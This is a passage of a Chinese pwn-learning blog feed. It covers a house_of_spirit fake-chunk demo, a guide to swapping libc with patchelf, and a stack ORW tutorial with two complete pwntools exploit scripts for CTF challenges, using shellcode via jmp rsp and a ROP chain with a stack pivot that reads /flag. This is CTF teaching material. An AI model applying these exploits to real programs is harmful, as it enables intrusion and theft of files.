<br></code></pre></td></tr></table></figure><p>在栈上准备我们的fake chunk<br><img src="/img/p4/image-57.png"></p><blockquote><p>对于fake chunk的M位，fake_chunks[1] &#x3D; 0x40; 就保证了AMP位均为0。<br>通过__attribute__保证了内存字节对齐<br>fake_chunks[9] &#x3D; 0x1234满足对next chunk 的检查</p></blockquote><h2 id="2-释放-fake-chunk"><a href="#2-释放-fake-chunk" class="headerlink" title="2. 释放 fake chunk"></a>2. 释放 fake chunk</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">void</span> *victim = &amp;fake_chunks[<span class="hljs-number">2</span>];<br><span class="hljs-built_in">free</span>(victim);<br></code></pre></td></tr></table></figure><p>释放fake chunk，可以看到精心构造的fake chunk成功绕过了检查，进入了fastbins中<br><img src="/img/p4/image-58.png"></p><h2 id="3-malloc-fake-chunk"><a href="#3-malloc-fake-chunk" class="headerlink" title="3. malloc fake chunk"></a>3. malloc fake chunk</h2><p>既然fastbins中存在我们的fake chunk，那么malloc 适当大小的chunk时，我们就能获得这个chunk了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">void</span> *allocated = calloc(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x30);<br></code></pre></td></tr></table></figure><p><img src="/img/p4/image-60.png" alt="allocated 分配到的内存地址就是victim的地址"></p></div>]]></content>
    
    
    <categories>
      
      <category>pwn学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>堆利用</tag>
      
      <tag>how2heap</tag>
      
      <tag>fastbin_dup</tag>
      
      <tag>fastbin_dup_into_stack</tag>
      
      <tag>house_of_spirit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用glibc-all-in-one和patchelf替换程序依赖的libc文件</title>
    <link href="/2024/11/18/%E4%BD%BF%E7%94%A8glibc-all-in-one%E5%92%8Cpatchelf%E6%9B%BF%E6%8D%A2%E7%A8%8B%E5%BA%8F%E4%BE%9D%E8%B5%96%E7%9A%84libc%E6%96%87%E4%BB%B6/"/>
    <url>/2024/11/18/%E4%BD%BF%E7%94%A8glibc-all-in-one%E5%92%8Cpatchelf%E6%9B%BF%E6%8D%A2%E7%A8%8B%E5%BA%8F%E4%BE%9D%E8%B5%96%E7%9A%84libc%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<div class="markdown-body"><h1 id="1-glibc-all-in-one下载所需要的libc文件"><a href="#1-glibc-all-in-one下载所需要的libc文件" class="headerlink" title="1. glibc-all-in-one下载所需要的libc文件"></a>1. glibc-all-in-one下载所需要的libc文件</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 克隆glibc-all-in-one 仓库</span><br>git <span class="hljs-built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one<br><span class="hljs-built_in">cd</span> glibc-all-in-one<br><br><span class="hljs-comment"># 更新最新版本的glibc</span><br><span class="hljs-built_in">sudo</span> python3 update_list             <span class="hljs-comment">#</span><br><br><span class="hljs-comment"># 查看可下载的glibc</span><br><span class="hljs-built_in">cat</span> list <br><br><span class="hljs-comment"># 下载所需要的glibc     </span><br><span class="hljs-comment"># 注意download 对应 list ；download_old 对应 list_old </span><br>./download 2.23-0ubuntu3_amd64  <span class="hljs-comment">#./download_old 2.21-0ubuntu4.3_amd64</span><br></code></pre></td></tr></table></figure><p>download之后就可以在glibc-all-in-one&#x2F;libs&#x2F;中可以看到下载的2.23-0ubuntu3_amd64，进入到文件夹中，关注这两个文件<br><img src="/img/p3/image-5.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># ld 和 libc文件路径</span><br>~<span class="hljs-regexp">/Desktop/</span>pwn<span class="hljs-regexp">/glibc-all-in-one/</span>libs<span class="hljs-regexp">/2.23-0ubuntu3_amd64/</span>ld-<span class="hljs-number">2.23</span>.so<br>~<span class="hljs-regexp">/Desktop/</span>pwn<span class="hljs-regexp">/glibc-all-in-one/</span>libs<span class="hljs-regexp">/2.23-0ubuntu3_amd64/</span>libc-<span class="hljs-number">2.23</span>.so<br></code></pre></td></tr></table></figure><h1 id="2-patchelf-更改程序依赖的libc文件"><a href="#2-patchelf-更改程序依赖的libc文件" class="headerlink" title="2. patchelf 更改程序依赖的libc文件"></a>2. patchelf 更改程序依赖的libc文件</h1><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-meta"># 安装 patchelf</span><br>sudo apt -<span class="hljs-built_in">y</span> install patchelf<br><br><span class="hljs-meta"># 替换 ld 文件</span><br>patchelf --<span class="hljs-keyword">set</span>-interpreter <span class="hljs-string">&quot;ld文件路径&quot;</span> <span class="hljs-string">&quot;程序路径&quot;</span><br><br><span class="hljs-meta"># 替换 libc文件</span><br>patchelf --replace-needed libc.so<span class="hljs-number">.6</span> <span class="hljs-string">&quot;libc文件路径&quot;</span> <span class="hljs-string">&quot;程序路径&quot;</span><br><br><span class="hljs-meta"># 查看程序的动态库依赖</span><br><span class="hljs-keyword">ldd</span> <span class="hljs-string">&quot;程序路径&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/p3/image-6.png" alt="a.out原本的动态库依赖"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># patchelf更改动态库依赖</span><br><span class="hljs-attribute">patchelf</span> --set-interpreter ~/Desktop/pwn/glibc-<span class="hljs-literal">all</span>-in-one/libs/<span class="hljs-number">2</span>.<span class="hljs-number">23</span>-<span class="hljs-number">0</span>ubuntu3_amd64/ld-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so a.out<br><span class="hljs-attribute">patchelf</span> --replace-needed libc.so.<span class="hljs-number">6</span> ~/Desktop/pwn/glibc-<span class="hljs-literal">all</span>-in-one/libs/<span class="hljs-number">2</span>.<span class="hljs-number">23</span>-<span class="hljs-number">0</span>ubuntu3_amd64/libc-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so a.out<br></code></pre></td></tr></table></figure><p><img src="/img/p3/image-7.png" alt="a.out替换libc文件后的动态库依赖"></p></div>]]></content>
    
    
    <categories>
      
      <category>pwn学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>glibc-all-in-one</tag>
      
      <tag>patchelf</tag>
      
      <tag>动态依赖库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈上ORW学习总结</title>
    <link href="/2024/11/12/%E6%A0%88%E4%B8%8AORW%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/2024/11/12/%E6%A0%88%E4%B8%8AORW%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="前置知识：沙箱保护和ORW"><a href="#前置知识：沙箱保护和ORW" class="headerlink" title="前置知识：沙箱保护和ORW"></a>前置知识：沙箱保护和ORW</h1><h2 id="沙箱保护-SandBox"><a href="#沙箱保护-SandBox" class="headerlink" title="沙箱保护 SandBox"></a>沙箱保护 SandBox</h2><p>正常情况下，程序可以使用所有的syscall，但其实这是不安全的，我们可以劫持程序流后通过execve的syscall来getshell。<br>如果不想让程序去执行execve，我们可以这样做：将程序放入一个沙箱中，在这个沙箱中添加一条规则——禁用execve函数。在这个沙箱中的程序只要调用了execve的系统调用，直接给他中断掉，这就是沙箱sandbox的作用。</p><p>SandBox的实现一般有两种，一种是<a href="https://www.cnblogs.com/L0g4n-blog/p/12839171.html">seccomp()函数调用</a>，另一种是<a href="https://blog.csdn.net/qq_44846324/article/details/121731640">prctl()函数调用</a></p><h2 id="沙箱检测"><a href="#沙箱检测" class="headerlink" title="沙箱检测"></a>沙箱检测</h2><p>首先安装seccomp-tools</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install gcc ruby-dev<br><span class="hljs-built_in">sudo</span> gem install seccomp-tools<br></code></pre></td></tr></table></figure><p>工具用法：seccomp-tools dump “程序”<br><img src="/img/p2/image-1.png"><br>可以看到程序如果调用了execve或execveat，会跳转到0004，然后被KILL掉，也就是程序禁用了execve和execveat <strong>（system函数实质上也是调用了execve函数，所以也禁用了system函数）</strong> </p><h2 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h2><p>想想我们以前是怎么拿到flag的？我们是先get shell，然后在shell中去执行我们想要的操作（cat &#x2F;flag），但如果程序禁用了execve，能不能跳过get shell的步骤，去直接拿到flag呢？</p><p>这就是ORW（open,read,write）的攻击方式：open打开目标的flag文件，read读取flag文件，write显示flag文件的内容。</p><p><strong>open()：打开文件</strong></p><blockquote><p>函数原型：int open(char <em>path,int access);<br>char <em>path——要打开的包含路径的文件名<br>int access——打开方式(只读模式、只写模式 、读写模式)——**设为0-只读模式</em></em><br>返回值： 成功  返回fd ，失败  返回-1</p></blockquote><p><strong>read()：读取文件内容</strong></p><blockquote><p>函数原型： int read(int fd,void <em>buf,int len);<br>int fd——文件描述符——*<em>设为open的返回值fd，一般为3，表示从打开的文件中读取内容</em></em><br>void *buf——为要将读取的内容保存的缓冲区<br>int len——读取文件的长度<br>返回值：返回实际读取的字节数</p></blockquote><p><strong>write()：写文件</strong></p><blockquote><p>函数原型： int write(int fd,void <em>buf,int len);<br>int fd——文件描述符——*<em>设为1,表示写</em></em><br>void *buf——要写入的内容<br>int len——要写入的长度<br>返回值：返回实际写入文件内容的长度</p></blockquote><p>栈上的orw根据利用方式分为orw_shellcode型和orw_ROP型，通过两个例题入手</p><h1 id="例1：ORW-shellcode-极客大挑战-2019-Not-Bad"><a href="#例1：ORW-shellcode-极客大挑战-2019-Not-Bad" class="headerlink" title="例1：ORW_shellcode [极客大挑战 2019]Not Bad"></a>例1：ORW_shellcode [极客大挑战 2019]Not Bad</h1><blockquote><p>题目链接：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p></blockquote><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec;file，64位，保护全关——没有开NX保护，可以在栈上写shellcode<br><img src="/img/p2/image-2.png"><br>IDA里面看到有三个函数，并在0x123000处开辟了0x1000的<strong>可写可执行</strong>的空间<br><img src="/img/p2/image-3.png"></p><p>第一个函数开启了seccomp函数，将他重命名为seccomp_init</p><p><img src="/img/p2/image-4.png"><br>第二个函数是设置缓存区，不用管<br><img src="/img/p2/image-5.png"><br>第三个函数就是我们的vuln函数了，buf这里可以看到一个明显的栈溢出，溢出长度为0x18字节<br><img src="/img/p2/image-6.png"></p><p>另外我们找到了一个 jmp rsp 汇编指令的地址，这个jmp rsp到底有什么用呢？我们在后面讲一下<br><img src="/img/p2/image-7.png"><br>既然开启了沙箱保护，那我们就用seccomp-tools看一下，可以看到函数允许了open,write,read函数，可以通过ORW的方式去获取到flag的内容<br><img src="/img/p2/image-8.png"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>溢出的长度只有0x18，是不够我们写入shellcode的，但是mmap为我们在0x123000开始的位置提供了很大一片空间，那么就可以用read函数在这块空间写入我们的shellcode（shellcode写什么？当然是open打开flag、read写入flag、write输出flag）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mmap</span> = <span class="hljs-number">0</span>x123000<br><span class="hljs-attribute">orw</span> = shellcraft.open(&#x27;./flag&#x27;)        <br><span class="hljs-attribute">orw</span>+ = shellcraft.read(<span class="hljs-number">3</span>,mmap,<span class="hljs-number">0</span>x100)      <br><span class="hljs-attribute">orw</span>+ = shellcraft.write(<span class="hljs-number">1</span>,mmap,<span class="hljs-number">0</span>x100)<br><span class="hljs-attribute">payload</span> = cyclic(<span class="hljs-number">0</span>x20+<span class="hljs-number">8</span>) + asm(shellcraft.read(<span class="hljs-number">0</span>,mmap,<span class="hljs-number">0</span>x100))<br></code></pre></td></tr></table></figure><p>这样send(payload)之后我们再send(orw)，就向mmap的空间写入了我们的shellcode，但是接下来的问题就是如何跳转到这里执行shellcode。这里就可以讲一下jmp rsp的作用</p><h2 id="jmp-rsp到底有什么用呢？"><a href="#jmp-rsp到底有什么用呢？" class="headerlink" title="jmp rsp到底有什么用呢？"></a>jmp rsp到底有什么用呢？</h2><p>调试看一下正常情况的vuln函数结束前后的栈结构，在leave;ret之前rsp的地址为0xddc0<br><img src="/img/p2/image-9.png"><br>leave，将rsp移到了rbp并+8<br><img src="/img/p2/image-10.png"><br>ret，rsp再+8<br><img src="/img/p2/image-11.png"><br>总的来说，rsp从0xddc0的位置来到了0xddf0的位置，想象一下如果我们将ret覆盖为 jmp rsp ，会怎么样呢？因为rsp现在来到了0xddf0，所以rip会指向0xddf0。<br>那么我们就知道该如何进行跳转了，把填充垃圾数据的部分利用起来，看看下边右图的栈结构<br><img src="/img/p2/image-12.png"><br>在栈顶写入read(0,mmap,0x100);mov rax;0x123000;call rax，填充垃圾数据，然后将ret覆盖为jmp esp，那么rip重新指向现在的rsp的值，接下来rsp-0x30（0x30&#x3D;填充的0x28+rsp自增的8），回到绿色的那两行，这两行用来做什么的？向read读入我们的orw，并且call调用它</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload = <span class="hljs-built_in">asm</span>(shellcraft<span class="hljs-selector-class">.read</span>(<span class="hljs-number">0</span>,mmap,<span class="hljs-number">0</span>x100)) +<span class="hljs-built_in">asm</span>(<span class="hljs-string">&#x27;mov r15,0x123000;call r15&#x27;</span>)<br>payload = payload<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">0</span>x28,b<span class="hljs-string">&#x27;\x90&#x27;</span>)<br>payload += <span class="hljs-built_in">p64</span>(jmp_rsp) + <span class="hljs-built_in">asm</span>(<span class="hljs-string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span>)<br></code></pre></td></tr></table></figure><blockquote><p>其实call rax和jmp rax都可以，区别如下：<br>call会把他的下一条指令的地址压入堆栈，然后跳转到他调用的开始处，同时ret会自动弹出返回地址。<br>JMP只是简单的跳转<br>call的本质相当于push+jmp  ret的本质相当于pop+jmp</p></blockquote><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs lua">from pwn import *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-built_in">io</span> = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">28895</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./bad&#x27;</span>)<br>jmp_rsp = <span class="hljs-number">0x400A01</span><br>mmap = <span class="hljs-number">0x123000</span><br>orw = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)<br>orw += shellcraft.<span class="hljs-built_in">read</span>(<span class="hljs-number">3</span>,mmap,<span class="hljs-number">0x100</span>)<br>orw += shellcraft.<span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>,mmap,<span class="hljs-number">0x100</span>)<br>orw = asm(orw)<br>payload = asm(shellcraft.<span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>,mmap,<span class="hljs-number">0x100</span>)) +asm(<span class="hljs-string">&#x27;mov r15,0x123000;call r15&#x27;</span>)<br>payload = payload.ljust(<span class="hljs-number">0x28</span>,b<span class="hljs-string">&#x27;\x90&#x27;</span>)<br>payload += p64(jmp_rsp) + asm(<span class="hljs-string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span>)<br><span class="hljs-built_in">io</span>.recvline()<br><span class="hljs-built_in">io</span>.send(payload)<br><span class="hljs-built_in">io</span>.send(orw)<br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure><h1 id="例2：ORW-ROP-HGAME-2023-week1-orw"><a href="#例2：ORW-ROP-HGAME-2023-week1-orw" class="headerlink" title="例2：ORW_ROP [HGAME 2023 week1] orw"></a>例2：ORW_ROP [HGAME 2023 week1] orw</h1><blockquote><p>题目链接：<a href="https://www.nssctf.cn/problem/3489">https://www.nssctf.cn/problem/3489</a></p></blockquote><h2 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h2><p>先把ld和libc链接到程序</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">kuban@kuban-virtual-machine:~/Desktop/pwn/test/orw<span class="hljs-symbol">$</span> patchelf --<span class="hljs-keyword">set</span>-interpreter /home/<span class="hljs-comment">kuban</span>/Desktop/<span class="hljs-comment">pwn</span>/test/<span class="hljs-comment">orw</span>/ld<span class="hljs-number">-2.31</span>.so vuln <br>kuban@kuban-virtual-machine:~/<span class="hljs-comment">Desktop</span>/pwn/<span class="hljs-comment">test</span>/orw$ patchelf --replace-needed libc.so<span class="hljs-number">.6</span> /<span class="hljs-comment">home</span>/kuban/<span class="hljs-comment">Desktop</span>/pwn/<span class="hljs-comment">test</span>/orw/<span class="hljs-comment">libc-2.31.so vuln</span><br>kuban@kuban-virtual-machine:~/Desktop/pwn/test/orw$ ldd <span class="hljs-comment">vuln</span> <br>        linux-vdso.so.1 (0x00007fff70b25000)<br>        /home/kuban/Desktop/pwn/test/orw/libc<span class="hljs-number">-2.31</span>.so (<span class="hljs-number">0x000076c7d729c000</span>)<br>        /home/kuban/Desktop/pwn/test/orw/ld-2.31.so <span class="hljs-comment">=&gt;</span> /lib64/<span class="hljs-comment">ld-linux-x86-64.so.2 (0x000076c7d7490000)</span><br></code></pre></td></tr></table></figure><p>checksec;file，64位，开启NX保护<br><img src="/img/p2/image-13.png"><br>IDA里面看一下<br>main函数开启了一个沙箱，输出一行后调用vuln函数<br><img src="/img/p2/image-14.png"><br>vuln函数就是一个非常简单的栈溢出，溢出长度有0x30个字节<br><img src="/img/p2/image-15.png"><br>检测一下沙箱，可以看到函数禁用了execve函数<br><img src="/img/p2/image-16.png"><br>记录一下gadget<br><img src="/img/p2/image-17.png"></p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>这道题主要有四个问题需要解决</p><ol><li><p>禁用了execve<br>解决方法：当然是orw啦</p></li><li><p>程序没有open、write函数<br>解决方法：用puts泄露libc，在libc中找到open,write并且返回到vuln函数继续下一步的利用</p></li><li><p>栈溢出长度只有0x28，不够写入ROP链<br>解决方法：利用leave_ret gadget将栈迁移到bss段<br><img src="/img/p2/image-18.png"></p></li><li><p>我们open之后，read和write要用到rdi,rsi和rdx三个寄存器传参，可是我们没有控制rdx的gadget？<br>解决办法：使用libc里面的rsi和rdx，libc_base+[libc_rsi&#x2F;rdx] 就可以了（具体看一下exp应该就懂了）<br><img src="/img/p2/image-19.png"></p><blockquote><p>其实对于问题3，我们也可以在libc中找到pop rsp的指令实现栈迁移，大家伙儿感兴趣可以试试</p></blockquote></li></ol><p>那么我们就可以分三步走<br>第一步：泄露libc，找到open,write并且返回到vuln函数，为第二步中read的buf迁移做准备。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">pop_rdi = <span class="hljs-number">0</span>x401393<br>ret = <span class="hljs-number">0</span>x40101a<br>leave_ret = <span class="hljs-number">0</span>x4012be<br>libc_dump_rsi = <span class="hljs-number">0</span>x2601f<br>libc_dump_rdx = <span class="hljs-number">0</span>x142c92<br><br>payload1 = <span class="hljs-built_in">cyclic</span>(<span class="hljs-number">0</span>x100+<span class="hljs-number">8</span>) + <span class="hljs-built_in">p64</span>(pop_rdi) + <span class="hljs-built_in">p64</span>(puts_got) + <span class="hljs-built_in">p64</span>(puts_plt) + <span class="hljs-built_in">p64</span>(vuln_addr)<br>io<span class="hljs-selector-class">.sendafter</span>(<span class="hljs-string">&#x27;before you try to solve this task.&#x27;</span>,payload1)<br>puts_addr = <span class="hljs-built_in">u64</span>(io<span class="hljs-selector-class">.recvuntil</span>(<span class="hljs-string">&#x27;\x7f&#x27;</span>)<span class="hljs-selector-attr">[-6:]</span><span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-function"><span class="hljs-title">success</span><span class="hljs-params">(hex(puts_addr)</span></span>)<br></code></pre></td></tr></table></figure><p>计算libc基地址，写出目标中我们需要的函数和gadget的地址</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">libc_base</span> = puts_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-attr">open_addr</span> = libc_base + libc.symbols[<span class="hljs-string">&#x27;open&#x27;</span>]<br><span class="hljs-attr">read_addr</span> = libc_base + libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>] <span class="hljs-comment"># read_addr = elf.plt[&#x27;read&#x27;]</span><br><span class="hljs-attr">write_addr</span> = libc_base + libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attr">pop_rsi</span> = libc_base + libc_dump_rsi<br><span class="hljs-attr">pop_rdi</span> = libc_base + libc_dump_rdi<br></code></pre></td></tr></table></figure><p>第二步：第一步完成后程序回到了vuln函数即将执行read(0, buf, 0x130uLL); 看一下汇编，可以看到这个read 写入的位置在 rbp-0x100 的位置<br><img src="/img/p2/image-20.png"></p><p>我们想要向bss段写入我们的orw，那么我们可以将rbp迁移到newrbp&#x3D;bss+0x200的位置，read就会向newrbp-0x100的位置写入数据了，我们的payload2这样构造</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">newrbp</span> = elf.bss(<span class="hljs-number">0</span>x200)<br><span class="hljs-attr">payload2</span> = cyclic(<span class="hljs-number">0</span>x100) + p64(newrbp) + p64(?)<br></code></pre></td></tr></table></figure><p>返回地址填什么？填vuln就错了，我们得直接去找到执行read(0, buf, 0x130uLL)的指令，才能向newrbp-0x100的位置写入ROP<br><img src="/img/p2/image-21.png"></p><p>这个指令在0x4012CF，我们可以写成vuln+0xF</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">newrbp = elf<span class="hljs-selector-class">.bss</span>(<span class="hljs-number">0</span>x200)<br>payload2 = <span class="hljs-built_in">cyclic</span>(<span class="hljs-number">0</span>x100) + <span class="hljs-built_in">p64</span>(newrbp) + <span class="hljs-built_in">p64</span>(vuln_addr + <span class="hljs-number">0</span>xF)<br>io<span class="hljs-selector-class">.sendline</span>(payload2)<br></code></pre></td></tr></table></figure><p>第三步：现在就是往我们的newbrp-0x100的位置写入flag和orw(flag)，最后将rbp覆盖为bss，返回地址覆盖为leave_ret，完成栈的迁移，执行ROP</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs smali">payload3 = b&#x27;/flag&#x27;.ljust(8,b&#x27;\x00&#x27;)<br>payload3 += p64(pop_rdi) + p64(newrbp-0x100) +p64(pop_rsi) + p64(0) + p64(open_addr)    <span class="hljs-comment"># open</span><br>payload3 += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(elf.bss(0x400)) + p64(pop_rdx) + p64(0x100) + p64(read_addr)     <span class="hljs-comment"># read</span><br>payload3 += p64(pop_rdi) + p64(1) + p64(write_addr)     <span class="hljs-comment">#write    #复用我们的rsi和rdx，不用重新pop了</span><br><span class="hljs-comment"># payload3 += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(0x404500) + p64(pop_rdx) + p64(0x100) + p64(write_addr)</span><br>payload3 = payload3.ljust(0x100,b&#x27;\x00&#x27;) + p64(newrbp-0x100) + p64(leave_ret)<br>io.sendline(payload3)<br></code></pre></td></tr></table></figure><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from pwn import *<br>context(log_level=&#x27;DEBUG&#x27;, arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)<br>io = remote(&#x27;node5.anna.nssctf.cn&#x27;,21109)<br>elf = ELF(&#x27;./vuln&#x27;)<br>libc = ELF(&#x27;./libc-2.31.so&#x27;)<br>pop_rdi = 0x401393<br>ret = 0x40101a<br>leave_ret = 0x4012be<br>libc_dump_rsi = 0x2601f<br>libc_dump_rdx = 0x142c92<br>vuln_addr = 0x4012C0<br>puts_plt = elf.plt[&#x27;puts&#x27;]<br>puts_got = elf.got[&#x27;puts&#x27;]<br><br>payload1 = cyclic(0x100+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)<br>io.sendlineafter(&#x27;before you try to solve this task.&#x27;,payload1)<br>puts_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>success(hex(puts_addr))<br><br>libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]<br>open_addr = libc_base + libc.symbols[&#x27;open&#x27;]<br><span class="hljs-comment"># read_addr = libc_base + libc.symbols[&#x27;read&#x27;]         </span><br>read_addr = elf.plt[&#x27;read&#x27;]<br>write_addr = libc_base + libc.symbols[&#x27;write&#x27;]<br>pop_rsi = libc_base + libc_dump_rsi<br>pop_rdx =  libc_base + libc_dump_rdx<br><br>newrbp = elf.bss(0x200)<br>payload2 = cyclic(0x100) + p64(newrbp) + p64(vuln_addr + 0xF)<br>io.sendline(payload2)<br><br>payload3 = b&#x27;/flag&#x27;.ljust(8,b&#x27;\x00&#x27;)<br>payload3 += p64(pop_rdi) + p64(newrbp-0x100) +p64(pop_rsi) + p64(0) + p64(open_addr)        <span class="hljs-comment"># open</span><br>payload3 += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(elf.bss(0x400)) + p64(pop_rdx) + p64(0x100) + p64(read_addr)         <span class="hljs-comment"># read</span><br>payload3 += p64(pop_rdi) + p64(1) + p64(write_addr)          <span class="hljs-comment">#write</span><br><span class="hljs-comment"># payload3 += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(0x404500) + p64(pop_rdx) + p64(0x100) + p64(write_addr)</span><br>payload3 = payload3.ljust(0x100,b&#x27;\x00&#x27;) + p64(newrbp-0x100) + p64(leave_ret)<br>io.sendline(payload3)<br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
